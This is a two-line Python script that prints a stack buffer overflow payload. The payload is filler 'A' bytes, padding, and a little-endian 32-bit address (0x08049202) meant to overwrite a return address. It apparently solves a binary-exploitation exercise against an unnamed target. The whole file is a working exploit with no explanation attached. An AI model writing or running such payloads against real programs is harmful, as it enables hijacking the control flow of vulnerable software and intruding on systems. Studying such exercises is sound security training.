#!/usr/bin/python
print ('AAAAAAAAAAAAAAAA01234567\x02\x92\x04\x08')
